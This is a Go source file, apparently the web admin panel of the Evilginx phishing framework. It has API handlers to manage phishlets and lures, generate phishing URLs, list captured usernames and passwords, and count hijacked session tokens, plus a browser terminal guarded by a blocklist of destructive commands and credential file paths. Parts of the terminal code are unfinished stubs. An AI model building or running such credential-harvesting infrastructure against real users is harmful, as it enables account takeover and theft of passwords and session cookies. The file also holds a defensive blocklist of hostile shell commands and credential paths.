	json.NewEncoder(w).Encode(stats)
}

func (ws *WebServer) handleAPIPhishlets(w http.ResponseWriter, r *http.Request) {
	var phishlets []PhishletInfo
	
	for _, name := range ws.cfg.GetPhishletNames() {
		_, err := ws.cfg.GetPhishlet(name)
		if err != nil {
			continue
		}
		
		config := ws.cfg.PhishletConfig(name)
		phishlets = append(phishlets, PhishletInfo{
			Name:     name,
			Enabled:  config.Enabled,
			Hostname: config.Hostname,
			Visible:  config.Visible,
		})
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(phishlets)
}

func (ws *WebServer) handleAPIPhishletEnable(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	if err := ws.cfg.SetSiteEnabled(name); err != nil {
		response := AuthResponse{
			Success: false,
			Message: "Failed to enable phishlet: " + err.Error(),
		}
		json.NewEncoder(w).Encode(response)
		return
	}

	response := AuthResponse{
		Success: true,
		Message: "Phishlet enabled",
	}
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAPIPhishletDisable(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	if err := ws.cfg.SetSiteDisabled(name); err != nil {
		response := AuthResponse{
			Success: false,
			Message: "Failed to disable phishlet: " + err.Error(),
		}
		json.NewEncoder(w).Encode(response)
		return
	}

	response := AuthResponse{
		Success: true,
		Message: "Phishlet disabled",
	}
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAPIPhishletHostname(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	var req struct {
		Hostname string `json:"hostname"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		response := AuthResponse{
			Success: false,
			Message: "Invalid request",
		}
		json.NewEncoder(w).Encode(response)
		return
	}

	if ok := ws.cfg.SetSiteHostname(name, req.Hostname); !ok {
		response := AuthResponse{
			Success: false,
			Message: "Failed to set hostname",
		}
		json.NewEncoder(w).Encode(response)
		return
	}

	response := AuthResponse{
		Success: true,
		Message: "Hostname set",
	}
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAPIPhishletCredentials(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	// Get all sessions for this phishlet
	sessions, err := ws.db.ListSessions()
	if err != nil {
		response := AuthResponse{
			Success: false,
			Message: "Failed to get sessions",
		}
		json.NewEncoder(w).Encode(response)
		return
	}

	var credentials []string
	for _, session := range sessions {
		if session.Phishlet == name {
			if session.Username != "" && session.Password != "" {
				credentials = append(credentials, fmt.Sprintf("Username: %s, Password: %s", session.Username, session.Password))
			}
		}
	}

	if len(credentials) == 0 {
		response := AuthResponse{
			Success: false,
			Message: "No credentials found for this phishlet",
		}
		json.NewEncoder(w).Encode(response)
		return
	}

	credentialsText := strings.Join(credentials, "\n")
	response := map[string]interface{}{
		"success": true,
		"credentials": credentialsText,
		"message": "Credentials retrieved",
	}
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAPILures(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	lures := ws.cfg.lures

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(lures)
}

func (ws *WebServer) handleAPICreateLure(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	var lure Lure
	if err := json.NewDecoder(r.Body).Decode(&lure); err != nil {
		http.Error(w, "Invalid lure data", http.StatusBadRequest)
		return
	}

	// Generate a random path if not provided
	if lure.Path == "" {
		lure.Path = "/" + GenRandomString(8)
	}

	ws.cfg.AddLure(lure.Phishlet, &lure)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(lure)
}

func (ws *WebServer) handleAPIUpdateLure(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		http.Error(w, "Invalid lure ID", http.StatusBadRequest)
		return
	}

	var lure Lure
	if err := json.NewDecoder(r.Body).Decode(&lure); err != nil {
		http.Error(w, "Invalid lure data", http.StatusBadRequest)
		return
	}

	if err := ws.cfg.SetLure(id, &lure); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(lure)
}

func (ws *WebServer) handleAPIDeleteLure(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		http.Error(w, "Invalid lure ID", http.StatusBadRequest)
		return
	}

	if err := ws.cfg.DeleteLure(id); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusNoContent)
}

func (ws *WebServer) handleAPILureGetURL(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		http.Error(w, "Invalid lure ID", http.StatusBadRequest)
		return
	}

	lure, err := ws.cfg.GetLure(id)
	if err != nil {
		http.Error(w, err.Error(), http.StatusNotFound)
		return
	}

	// Generate the phishing URL
	pl, err := ws.cfg.GetPhishlet(lure.Phishlet)
	if err != nil {
		http.Error(w, "Phishlet not found", http.StatusNotFound)
		return
	}

	var phishURL string
	if lure.Hostname != "" {
		phishURL = "https://" + lure.Hostname + lure.Path
	} else {
		bhost, ok := ws.cfg.GetSiteDomain(pl.Name)
		if !ok || len(bhost) == 0 {
			http.Error(w, "No hostname set for phishlet", http.StatusBadRequest)
			return
		}
		purl, err := pl.GetLureUrl(lure.Path)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		phishURL = purl
	}

	response := map[string]interface{}{
		"lure": lure,
		"url":  phishURL,
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := ws.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Error("websocket upgrade error: %v", err)
		return
	}
	defer conn.Close()

	ws.clientsMutex.Lock()
	ws.clients[conn] = true
	ws.clientsMutex.Unlock()

	log.Info("websocket client connected")

	// Send initial data
	ws.sendToClient(conn, "stats_update", ws.getStatsData())
	sessions, _ := ws.db.ListSessions()
	ws.sendToClient(conn, "session_update", sessions)

	// Keep connection alive
	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			log.Debug("websocket client disconnected: %v", err)
			break
		}
	}

	ws.clientsMutex.Lock()
	delete(ws.clients, conn)
	ws.clientsMutex.Unlock()
}

func (ws *WebServer) sendToClient(conn *websocket.Conn, msgType string, data interface{}) {
	message := WebSocketMessage{
		Type: msgType,
		Data: data,
		Time: time.Now(),
	}

	err := conn.WriteJSON(message)
	if err != nil {
		log.Error("websocket write error: %v", err)
	}
}

// Session management methods
func (ws *WebServer) generateSessionToken() string {
	bytes := make([]byte, 32)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func (ws *WebServer) createSession(ip string) string {
	token := ws.generateSessionToken()
	ws.sessionsMutex.Lock()
	defer ws.sessionsMutex.Unlock()
	
	ws.sessions[token] = &AuthSession{
		Token:     token,
		CreatedAt: time.Now(),
		ExpiresAt: time.Now().Add(24 * time.Hour),
		IPAddress: ip,
	}
	
	return token
}

func (ws *WebServer) validateSession(token string) bool {
	ws.sessionsMutex.RLock()
	defer ws.sessionsMutex.RUnlock()
	
	session, exists := ws.sessions[token]
	if !exists {
		return false
	}
	
	if time.Now().After(session.ExpiresAt) {
		// Session expired
		delete(ws.sessions, token)
		return false
	}
	
	return true
}

func (ws *WebServer) destroySession(token string) {
	ws.sessionsMutex.Lock()
	defer ws.sessionsMutex.Unlock()
	
	delete(ws.sessions, token)
}

func (ws *WebServer) cleanupExpiredSessions() {
	ws.sessionsMutex.Lock()
	defer ws.sessionsMutex.Unlock()
	
	now := time.Now()
	for token, session := range ws.sessions {
		if now.After(session.ExpiresAt) {
			delete(ws.sessions, token)
		}
	}
}

func (ws *WebServer) getClientIP(r *http.Request) string {
	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded != "" {
		return forwarded
	}
	
	realIP := r.Header.Get("X-Real-IP")
	if realIP != "" {
		return realIP
	}
	
	return r.RemoteAddr
}

// Authentication handlers
func (ws *WebServer) handleAuthStatus(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	
	token := r.Header.Get("Authorization")
	isAuthenticated := ws.validateSession(token)
	
	response := AuthStatusResponse{
		IsSetup:         ws.cfg.IsSetup(),
		IsLocked:        ws.cfg.IsLocked(),
		IsAuthenticated: isAuthenticated,
	}
	
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAuthSetup(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	
	if ws.cfg.IsSetup() {
		response := SetupResponse{
			Success: false,
			Message: "Authentication is already setup",
		}
		json.NewEncoder(w).Encode(response)
		return
	}
	
	key := ws.cfg.GenerateAuthKey()
	ws.cfg.SetupAuth(key)
	
	response := SetupResponse{
		Success: true,
		Key:     key,
		Message: "Authentication setup complete",
	}
	
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAuthLogin(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	
	if !ws.cfg.IsSetup() {
		response := AuthResponse{
			Success: false,
			Message: "Authentication not setup",
		}
		json.NewEncoder(w).Encode(response)
		return
	}
	
	var req AuthRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		response := AuthResponse{
			Success: false,
			Message: "Invalid request",
		}
		json.NewEncoder(w).Encode(response)
		return
	}
	
	if !ws.cfg.ValidateKey(req.Key) {
		response := AuthResponse{
			Success: false,
			Message: "Invalid key",
		}
		json.NewEncoder(w).Encode(response)
		return
	}
	
	token := ws.createSession(ws.getClientIP(r))
	ws.cfg.UpdateLastAccess()
	
	response := AuthResponse{
		Success: true,
		Token:   token,
		Message: "Login successful",
	}
	
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAuthLogout(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	
	token := r.Header.Get("Authorization")
	if token != "" {
		ws.destroySession(token)
	}
	
	response := AuthResponse{
		Success: true,
		Message: "Logout successful",
	}
	
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAuthLock(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	
	token := r.Header.Get("Authorization")
	if !ws.validateSession(token) {
		response := AuthResponse{
			Success: false,
			Message: "Unauthorized",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}
	
	ws.cfg.LockPanel()
	
	// Destroy all sessions
	ws.sessionsMutex.Lock()
	ws.sessions = make(map[string]*AuthSession)
	ws.sessionsMutex.Unlock()
	
	response := AuthResponse{
		Success: true,
		Message: "Panel locked",
	}
	
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) handleAuthUnlock(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	
	if !ws.cfg.IsLocked() {
		response := AuthResponse{
			Success: false,
			Message: "Panel is not locked",
		}
		json.NewEncoder(w).Encode(response)
		return
	}
	
	var req AuthRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		response := AuthResponse{
			Success: false,
			Message: "Invalid request",
		}
		json.NewEncoder(w).Encode(response)
		return
	}
	
	if !ws.cfg.ValidateKey(req.Key) {
		response := AuthResponse{
			Success: false,
			Message: "Invalid key",
		}
		json.NewEncoder(w).Encode(response)
		return
	}
	
	ws.cfg.UnlockPanel()
	
	response := AuthResponse{
		Success: true,
		Message: "Panel unlocked",
	}
	
	json.NewEncoder(w).Encode(response)
}

func (ws *WebServer) BroadcastToClients(msgType string, data interface{}) {
	ws.clientsMutex.RLock()
	defer ws.clientsMutex.RUnlock()

	message := WebSocketMessage{
		Type: msgType,
		Data: data,
		Time: time.Now(),
	}

	for conn := range ws.clients {
		err := conn.WriteJSON(message)
		if err != nil {
			log.Error("websocket broadcast error: %v", err)
			conn.Close()
			delete(ws.clients, conn)
		}
	}
}

func (ws *WebServer) getStatsData() map[string]interface{} {
	sessions, _ := ws.db.ListSessions()
	
	activeSessions := 0
	capturedSessions := 0
	
	for _, session := range sessions {
		if len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0 {
			capturedSessions++
		}
		if time.Now().Unix()-session.UpdateTime < 86400 {
			activeSessions++
		}
	}

	uptime := time.Since(startTime)
	uptimeStr := fmt.Sprintf("%dh %dm", int(uptime.Hours()), int(uptime.Minutes())%60)

	return map[string]interface{}{
		"total_sessions":    len(sessions),
		"active_sessions":   activeSessions,
		"captured_sessions": capturedSessions,
		"uptime":           uptimeStr,
	}
}

func (ws *WebServer) NotifyNewSession(session *database.Session) {
	ws.BroadcastToClients("new_session", session)
}

func (ws *WebServer) NotifySessionUpdate(session *database.Session) {
	ws.BroadcastToClients("session_update", session)
}

// Command filter initialization
func NewCommandFilter() *CommandFilter {
	return &CommandFilter{
		blockedCommands: []string{
			"rm -rf",
			"dd if=/dev/zero",
			":(){ :|:& };:",
			"fork()",
			"sudo su",
			"chmod 777",
			"chown root",
			"mkfs",
			"fdisk",
			"parted",
			"systemctl stop",
			"systemctl disable",
			"iptables -F",
			"ufw disable",
			"passwd root",
			"userdel",
			"usermod",
			"crontab -r",
			"history -c",
			"shred",
			"killall",
		},
		blockedPaths: []string{
			"/etc/passwd",
			"/etc/shadow",
			"/etc/sudoers",
			"/root/",
			"/home/*/.ssh",
			"/var/log/auth.log",
			"/var/log/secure",
			"/proc/",
			"/sys/",
		},
	}
}

func (cf *CommandFilter) IsCommandSafe(command string) bool {
	cmd := strings.TrimSpace(strings.ToLower(command))
	
	// Check for blocked commands
	for _, blocked := range cf.blockedCommands {
		if strings.Contains(cmd, blocked) {
			return false
		}
	}
	
	// Check for blocked paths
	for _, blockedPath := range cf.blockedPaths {
		if strings.Contains(cmd, blockedPath) {
			return false
		}
	}
	
	return true
}

// Terminal WebSocket handler
func (ws *WebServer) handleTerminalWebSocket(w http.ResponseWriter, r *http.Request) {
	// Check authentication
	token := r.Header.Get("Authorization")
	if token == "" {
		// Try to get token from query parameter (for WebSocket connections)
		token = r.URL.Query().Get("token")
	}
	
	if !ws.validateSession(token) {
		log.Warning("unauthorized terminal access attempt from %s", r.RemoteAddr)
		http.Error(w, "Unauthorized", 401)
		return
	}
	
	// Upgrade to WebSocket
	conn, err := ws.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Error("terminal websocket upgrade error: %v", err)
		return
	}
	
	// Create terminal session
	sessionID := ws.generateSessionToken()
	session, err := ws.createTerminalSession(sessionID, token)
	if err != nil {
		log.Error("failed to create terminal session: %v", err)
		conn.Close()
		return
	}
	
	session.Conn = conn
	log.Info("terminal session created: %s", sessionID)
	
	// Start terminal I/O
	go ws.handleTerminalOutput(session)
	go ws.handleTerminalInput(session)
	
	// Session cleanup
	defer ws.cleanupTerminalSession(sessionID)
	
	// Keep session alive
	for {
		if !session.IsActive {
			break
		}
		time.Sleep(1 * time.Second)
	}
}

func (ws *WebServer) createTerminalSession(sessionID, userToken string) (*TerminalSession, error) {
	// Create bash command with restricted environment
	cmd := exec.Command("/bin/bash", "-i")
	cmd.Env = []string{
		"TERM=xterm-256color",
		"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
		"HOME=/tmp",
		"USER=evilginx",
		"SHELL=/bin/bash",
		"PS1=\\[\\033[1;32m\\]evilginx\\[\\033[0m\\]@\\[\\033[1;34m\\]terminal\\[\\033[0m\\]:\\[\\033[1;31m\\]\\w\\[\\033[0m\\]$ ",
	}
	
	// For systems with pty support, we'd use pty.Start(cmd) here
	// For now, we'll use basic pipes
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return nil, err
	}
	
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return nil, err
	}
	
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return nil, err
	}
	
	if err := cmd.Start(); err != nil {
		return nil, err
	}
	
	session := &TerminalSession{
		ID:           sessionID,
		CMD:          cmd,
		PTY:          stdin.(*os.File), // This is a simplification
		CreatedAt:    time.Now(),
		LastActivity: time.Now(),
		UserID:       userToken,
		IsActive:     true,
	}
	
	ws.terminalMutex.Lock()
	ws.terminalSessions[sessionID] = session
	ws.terminalMutex.Unlock()
	
	// Handle stdout and stderr
	go func() {
		buf := make([]byte, 1024)
		for {
			n, err := stdout.Read(buf)
			if err != nil {
				if err != io.EOF {
					log.Error("Error reading stdout: %v", err)
				}
				break
			}
			if n > 0 {
				err = session.Conn.WriteMessage(websocket.TextMessage, buf[:n])
				if err != nil {
					log.Error("Error writing to websocket: %v", err)
					break
				}
			}
		}
	}()
	
	go func() {
		buf := make([]byte, 1024)
		for {
			n, err := stderr.Read(buf)
			if err != nil {
				if err != io.EOF {
					log.Error("Error reading stderr: %v", err)
				}
				break
			}
			if n > 0 {
				err = session.Conn.WriteMessage(websocket.TextMessage, buf[:n])
				if err != nil {
					log.Error("Error writing to websocket: %v", err)
					break
				}
			}
		}
	}()
	
	return session, nil
}

func (ws *WebServer) handleTerminalOutput(session *TerminalSession) {
	// This would handle PTY output in a full implementation
	// For now, it's handled in createTerminalSession
}

func (ws *WebServer) handleTerminalInput(session *TerminalSession) {
	defer session.Conn.Close()
	
	var commandBuffer strings.Builder
	
	for {
		_, message, err := session.Conn.ReadMessage()
		if err != nil {
			log.Debug("terminal websocket read error: %v", err)
			break
		}
		
		session.mutex.Lock()
		session.LastActivity = time.Now()
		session.mutex.Unlock()
		
		// Process input character by character
		for _, char := range string(message) {
			switch char {
			case '\r', '\n':
				// Command entered, check if safe
				command := commandBuffer.String()
				if command != "" && !ws.commandFilter.IsCommandSafe(command) {
					// Block dangerous command
					warningMsg := fmt.Sprintf("\r\n❌ Command blocked for security: %s\r\n", command)
					session.Conn.WriteMessage(1, []byte(warningMsg))
					commandBuffer.Reset()
					continue
				}
				commandBuffer.Reset()
			case '\b', 127: // Backspace
				if commandBuffer.Len() > 0 {
					str := commandBuffer.String()
					commandBuffer.Reset()
					commandBuffer.WriteString(str[:len(str)-1])
				}
			default:
				commandBuffer.WriteRune(char)
			}
		}
		
		// Forward input to terminal (in a full implementation)
		// For now, we'll just echo back
		session.Conn.WriteMessage(1, message)
	}
}

func (ws *WebServer) cleanupTerminalSession(sessionID string) {
	ws.terminalMutex.Lock()
	defer ws.terminalMutex.Unlock()
	
	session, exists := ws.terminalSessions[sessionID]
	if !exists {
		return
	}
	
	session.IsActive = false
	
	if session.CMD != nil && session.CMD.Process != nil {
		session.CMD.Process.Kill()
	}
	
	if session.Conn != nil {
		session.Conn.Close()
	}
	
	delete(ws.terminalSessions, sessionID)
	log.Info("terminal session cleaned up: %s", sessionID)
}